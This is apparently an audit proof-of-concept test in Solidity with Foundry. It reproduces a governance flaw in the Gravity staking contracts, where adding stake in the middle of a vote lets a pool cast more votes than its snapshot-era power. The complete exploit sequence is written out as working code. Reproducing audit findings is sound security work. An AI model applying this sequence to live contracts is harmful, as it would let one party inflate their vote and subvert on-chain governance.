// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { Staking } from "@gravity/staking/Staking.sol";
import { StakePool } from "@gravity/staking/StakePool.sol";
import { StakingConfig } from "@gravity/runtime/StakingConfig.sol";
import { GovernanceConfig } from "@gravity/runtime/GovernanceConfig.sol";
import { Governance } from "@gravity/governance/Governance.sol";
import { Timestamp } from "@gravity/runtime/Timestamp.sol";
import { SystemAddresses } from "@gravity/foundation/SystemAddresses.sol";
import { ValidatorStatus } from "@gravity/foundation/Types.sol";

/// @notice Mock ValidatorManagement — pool is treated as non-validator so the
///         unstake-branch min-bond check is skipped. Not strictly needed for this
///         PoC (we never unstake), but keeps the dependency graph deterministic
///         if any path unexpectedly consults validator status.
contract MockValidatorManagement {
    function isValidator(address) external pure returns (bool) {
        return false;
    }

    function getValidatorStatus(address) external pure returns (ValidatorStatus) {
        return ValidatorStatus.INACTIVE;
    }
}

/// @notice Mock Reconfiguration — never in progress, so `whenNotReconfiguring`
///         and createPool's reconfig guard both pass.
contract MockReconfiguration {
    function isTransitionInProgress() external pure returns (bool) {
        return false;
    }
}

/// @title PoC for gravity-audit issue #554
/// @notice "Voting power is live-read, not snapshotted — mid-vote addStake inflates
///          remaining power on subsequent vote calls" (Governance.sol / StakePool.sol).
///
/// @dev Exploit chain:
///        1. Voter casts partial yes-vote V1 using snapshot-era power P1.
///        2. Staker calls StakePool.addStake{value: X}() — activeStake += X and
///           lockedUntil extends to `now + lockupDuration` (covers p.expirationTime
///           under typical config where lockupDuration >= votingDuration).
///        3. Voter casts another yes-vote V2. getRemainingVotingPower re-reads
///           getPoolVotingPower(pool, p.expirationTime) → (P1 + X) live. Remaining
///           = (P1 + X) - V1. V2 is capped at remaining and usedVotingPower
///           accumulates to P1 + X total — strictly more than the P1 snapshot
///           that was logically in effect at proposal creation.
///
///      This test PASSES on vulnerable code (main, a623eab) — meaning the exploit
///      reproduced: cumulative voted > P1 and yesVotes equals P1 + X.
contract POC_554 is Test {
    Staking public staking;
    StakingConfig public stakingConfig;
    GovernanceConfig public governanceConfig;
    Governance public governance;
    Timestamp public timestamp;

    address public attackerStaker = makeAddr("attackerStaker");
    address public voter = makeAddr("voter");

    // Staking config constants
    uint256 constant MIN_STAKE = 1 ether;
    // lockupDuration >= votingDuration is the "typical config" assumed by the issue.
    // Pick 14 days lockup vs 1 day voting — comfortable margin.
    uint64 constant LOCKUP_DURATION = uint64(14 days) * 1_000_000;
    uint64 constant UNBONDING_DELAY = uint64(7 days) * 1_000_000;
    uint64 constant VOTING_DURATION = uint64(1 days) * 1_000_000;

    uint64 constant INITIAL_TIMESTAMP = 1_000_000_000_000_000;

    // Proposal parameters
    uint128 constant MIN_VOTING_THRESHOLD = 1;
    uint256 constant REQUIRED_PROPOSER_STAKE = 1 ether;

    // Pool stake (P1) and the mid-vote inflation amount (X).
    uint256 constant P1 = 10 ether;
    uint256 constant X = 90 ether;

    // Partial vote amounts
    uint128 constant V1 = uint128(1 ether);

    function _initStakingConfigEither() internal {
        vm.prank(SystemAddresses.GENESIS);
        (bool ok3,) = address(stakingConfig).call(
            abi.encodeWithSignature(
                "initialize(uint256,uint64,uint64)", MIN_STAKE, LOCKUP_DURATION, UNBONDING_DELAY
            )
        );
        if (ok3) return;

        vm.prank(SystemAddresses.GENESIS);
        (bool ok4,) = address(stakingConfig).call(
            abi.encodeWithSignature(
                "initialize(uint256,uint64,uint64,uint256)",
                MIN_STAKE,
                LOCKUP_DURATION,
                UNBONDING_DELAY,
                MIN_STAKE
            )
        );
        require(ok4, "StakingConfig.initialize: neither 3-arg nor 4-arg worked");
    }

    function _initGovernanceConfigEither() internal {
        vm.prank(SystemAddresses.GENESIS);
        (bool ok,) = address(governanceConfig).call(
            abi.encodeWithSignature(
                "initialize(uint128,uint256,uint64)",
                MIN_VOTING_THRESHOLD,
                REQUIRED_PROPOSER_STAKE,
                VOTING_DURATION
            )
        );
        require(ok, "GovernanceConfig.initialize failed");
    }

    function setUp() public {
        // Deploy timestamp first — other contracts read from it.
        vm.etch(SystemAddresses.TIMESTAMP, address(new Timestamp()).code);
        timestamp = Timestamp(SystemAddresses.TIMESTAMP);

        // Prime timestamp to a sane non-zero value.
        vm.prank(SystemAddresses.BLOCK);
        timestamp.updateGlobalTime(attackerStaker, INITIAL_TIMESTAMP);

        // StakingConfig + GovernanceConfig at their canonical addresses.
        vm.etch(SystemAddresses.STAKE_CONFIG, address(new StakingConfig()).code);
        stakingConfig = StakingConfig(SystemAddresses.STAKE_CONFIG);
        _initStakingConfigEither();

        vm.etch(SystemAddresses.GOVERNANCE_CONFIG, address(new GovernanceConfig()).code);
        governanceConfig = GovernanceConfig(SystemAddresses.GOVERNANCE_CONFIG);
        _initGovernanceConfigEither();

        // Staking factory at canonical STAKING address.
        vm.etch(SystemAddresses.STAKING, address(new Staking()).code);
        staking = Staking(SystemAddresses.STAKING);

        // Mocks for VALIDATOR_MANAGER / RECONFIGURATION dependencies.
        vm.etch(SystemAddresses.VALIDATOR_MANAGER, address(new MockValidatorManagement()).code);
        vm.etch(SystemAddresses.RECONFIGURATION, address(new MockReconfiguration()).code);

        // Governance contract — constructor takes initialOwner.
        // We use the deployed instance directly rather than etching at the canonical
        // SystemAddresses.GOVERNANCE slot. Reason: `nextProposalId` is an initialised
        // state variable (`= 1`) that relies on the constructor running; `vm.etch`
        // copies code but zeroes state, which would trip the `InvalidProposalId()`
        // guard at L317. Nothing in the exploit path reads `SystemAddresses.GOVERNANCE`
        // — Governance is the caller, not a callee — so canonical-address binding
        // is unnecessary for this PoC.
        governance = new Governance(address(this));

        // Fund attacker staker with plenty of ETH for initial stake + mid-vote addStake.
        vm.deal(attackerStaker, 1000 ether);
    }

    function test_attackSucceedsIfVulnerable() public {
        // --- Step 0: create a StakePool with initial stake P1 and lockup long enough
        //             to cover the full voting period.
        uint64 initialLockedUntil = INITIAL_TIMESTAMP + LOCKUP_DURATION;

        vm.prank(attackerStaker);
        address poolAddr = staking.createPool{ value: P1 }(
            attackerStaker, // owner
            attackerStaker, // staker
            attackerStaker, // operator (unused here)
            voter,          // delegated voter
            initialLockedUntil
        );
        StakePool pool = StakePool(payable(poolAddr));

        // Sanity: the pool's active stake equals P1 and voting power at any time
        // within lockup equals P1.
        assertEq(pool.activeStake(), P1, "sanity: initial activeStake == P1");

        // --- Step 1: voter creates a proposal using this pool.
        // createProposal requires caller == pool.voter. expirationTime will be
        // now + votingDuration == INITIAL_TIMESTAMP + VOTING_DURATION.
        address[] memory targets = new address[](1);
        targets[0] = address(0xdead);
        bytes[] memory datas = new bytes[](1);
        datas[0] = hex"";

        vm.prank(voter);
        uint64 proposalId = governance.createProposal(poolAddr, targets, datas, "ipfs://dummy");

        uint64 expirationTime = INITIAL_TIMESTAMP + VOTING_DURATION;

        // The voting-power snapshot that SHOULD have been in effect: P1.
        uint256 snapshotPower = staking.getPoolVotingPower(poolAddr, expirationTime);
        assertEq(snapshotPower, P1, "sanity: pool power at expiration == P1 pre-inflation");

        uint128 remainingBefore = governance.getRemainingVotingPower(poolAddr, proposalId);
        emit log_named_uint("remaining BEFORE V1", remainingBefore);
        assertEq(remainingBefore, uint128(P1), "sanity: remaining == P1");

        // --- Step 2: partial vote V1 (yes).
        vm.prank(voter);
        governance.vote(poolAddr, proposalId, V1, true);
        assertEq(governance.usedVotingPower(poolAddr, proposalId), V1, "used += V1");

        uint128 remainingAfterV1 = governance.getRemainingVotingPower(poolAddr, proposalId);
        emit log_named_uint("remaining AFTER  V1 (pre-inflation)", remainingAfterV1);
        assertEq(remainingAfterV1, uint128(P1) - V1, "remaining = P1 - V1");

        // --- Step 3: MID-VOTE INFLATION — staker calls addStake{value: X}().
        // Advance time by 1 microsecond (not strictly required but mirrors the
        // real-world cross-block nature of the attack). We do NOT cross
        // expirationTime.
        vm.prank(SystemAddresses.BLOCK);
        timestamp.updateGlobalTime(attackerStaker, INITIAL_TIMESTAMP + 1);

        vm.prank(attackerStaker);
        pool.addStake{ value: X }();

        // activeStake should now be P1 + X; lockedUntil should have been extended
        // to now + lockupDuration which comfortably covers expirationTime.
        assertEq(pool.activeStake(), P1 + X, "post-inflation: activeStake == P1 + X");
        assertGe(pool.lockedUntil(), expirationTime, "post-inflation: lockedUntil covers expiration");

        // --- Step 4: getRemainingVotingPower re-reads — it now sees P1 + X.
        uint256 powerAfterInflation = staking.getPoolVotingPower(poolAddr, expirationTime);
        emit log_named_uint("pool power at expiration AFTER inflation", powerAfterInflation);
        assertEq(powerAfterInflation, P1 + X, "live-read confirms pool power inflated to P1+X");

        uint128 remainingAfterInflation = governance.getRemainingVotingPower(poolAddr, proposalId);
        emit log_named_uint("remaining AFTER inflation (before V2)", remainingAfterInflation);
        assertEq(
            remainingAfterInflation,
            uint128(P1 + X) - V1,
            "bug: remaining recomputed against inflated live power"
        );

        // --- Step 5: cast V2 with the max possible amount. Governance will cap
        // automatically at `remaining`.
        uint128 V2 = type(uint128).max;
        vm.prank(voter);
        governance.vote(poolAddr, proposalId, V2, true);

        uint128 usedFinal = governance.usedVotingPower(poolAddr, proposalId);
        emit log_named_uint("usedVotingPower final", usedFinal);

        // --- Exploit assertions ---
        // The snapshot power at proposal creation was P1. The pool has now voted
        // P1 + X, which is strictly greater than the snapshot — EC4 / C10 violated.
        assertGt(uint256(usedFinal), snapshotPower, "EXPLOIT: voted > snapshot-era power");
        assertEq(uint256(usedFinal), P1 + X, "EXPLOIT: voted exactly P1 + X");

        // yesVotes on the proposal reflects the inflated weight.
        uint128 yesVotes = governance.getProposal(proposalId).yesVotes;
        emit log_named_uint("yesVotes final", yesVotes);
        assertEq(uint256(yesVotes), P1 + X, "EXPLOIT: proposal yesVotes == P1 + X");
    }
}
